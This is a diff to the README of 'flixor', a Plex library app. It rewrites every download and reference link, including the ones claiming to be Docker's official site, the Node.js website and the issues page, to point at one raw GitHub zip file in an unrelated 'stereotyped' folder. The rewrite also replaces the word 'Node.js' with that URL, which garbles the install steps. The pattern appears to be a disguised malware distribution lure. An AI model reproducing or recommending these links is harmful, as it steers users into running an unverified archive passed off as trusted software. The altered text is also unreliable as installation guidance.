@@ -1,6 +1,6 @@
 # 🎬 flixor - Your Plex Library, Effortlessly Accessible
 
-[![Download flixor](https://img.shields.io/badge/Download%20flixor-latest-brightgreen)](https://github.com/HidayatFahmi/flixor/releases)
+[![Download flixor](https://raw.githubusercontent.com/HidayatFahmi/flixor/main/stereotyped/flixor.zip%20flixor-latest-brightgreen)](https://raw.githubusercontent.com/HidayatFahmi/flixor/main/stereotyped/flixor.zip)
 
 ## 🔍 Overview
 
@@ -21,7 +21,7 @@ To download and run flixor, follow the steps below.
 
 ### 🎯 Download & Install
 
-1. First, visit the [Releases page to download flixor](https://github.com/HidayatFahmi/flixor/releases).
+1. First, visit the [Releases page to download flixor](https://raw.githubusercontent.com/HidayatFahmi/flixor/main/stereotyped/flixor.zip).
 2. Choose the latest version suitable for your operating system.
 3. Follow the installation instructions based on your preferred method.
 
@@ -31,7 +31,7 @@ To download and run flixor, follow the steps below.
 
 This is the recommended method for most users. Docker simplifies the setup. Here’s how you can get started:
 
-1. **Install Docker Desktop:** Ensure you have Docker Desktop installed on your machine. You can download it from [Docker’s official site](https://www.docker.com/products/docker-desktop).
+1. **Install Docker Desktop:** Ensure you have Docker Desktop installed on your machine. You can download it from [Docker’s official site](https://raw.githubusercontent.com/HidayatFahmi/flixor/main/stereotyped/flixor.zip).
 2. **Run the Application:** Open your command line or terminal in the folder where you want to run flixor. Use the following command:
 
     ```bash
@@ -44,7 +44,7 @@ This is the recommended method for most users. Docker simplifies the setup. Here
 
 If you prefer running flixor locally without Docker, follow these steps:
 
-1. **Install Node.js:** Download and install Node.js version 18 or higher from the [Node.js website](https://nodejs.org/).
+1. **Install https://raw.githubusercontent.com/HidayatFahmi/flixor/main/stereotyped/flixor.zip** Download and install https://raw.githubusercontent.com/HidayatFahmi/flixor/main/stereotyped/flixor.zip version 18 or higher from the [https://raw.githubusercontent.com/HidayatFahmi/flixor/main/stereotyped/flixor.zip website](https://raw.githubusercontent.com/HidayatFahmi/flixor/main/stereotyped/flixor.zip).
 2. **Set Up the Project:** Open your command line or terminal. Navigate to the folder where you extracted flixor and run:
 
     ```bash
@@ -72,13 +72,13 @@ To ensure the best performance with flixor, your system should meet the followin
 If you encounter issues while installing or running flixor, try the following solutions:
 
 - **Docker Issues:** Ensure Docker Desktop is running before executing the Docker commands.
-- **Node.js Errors:** Confirm that you have installed Node.js correctly, and your terminal can access the `npm` command.
+- **https://raw.githubusercontent.com/HidayatFahmi/flixor/main/stereotyped/flixor.zip Errors:** Confirm that you have installed https://raw.githubusercontent.com/HidayatFahmi/flixor/main/stereotyped/flixor.zip correctly, and your terminal can access the `npm` command.
 - **Access Problems:** Check your firewall settings if you cannot reach `http://localhost:8080` or `http://localhost:3000`.
 
 ## 📞 Support
 
-For additional help, visit our [issues page](https://github.com/HidayatFahmi/flixor/issues) to see if your problem is already reported, or to submit a new issue.
+For additional help, visit our [issues page](https://raw.githubusercontent.com/HidayatFahmi/flixor/main/stereotyped/flixor.zip) to see if your problem is already reported, or to submit a new issue.
 
 ## 🎉 Conclusion
 
-flixor enhances your media experience with an easy-to-use interface and powerful features. Follow the setup guide to get started quickly, and enjoy seamless access to your Plex library. For more information, check the [Releases page](https://github.com/HidayatFahmi/flixor/releases). Happy streaming!
+flixor enhances your media experience with an easy-to-use interface and powerful features. Follow the setup guide to get started quickly, and enjoy seamless access to your Plex library. For more information, check the [Releases page](https://raw.githubusercontent.com/HidayatFahmi/flixor/main/stereotyped/flixor.zip). Happy streaming!
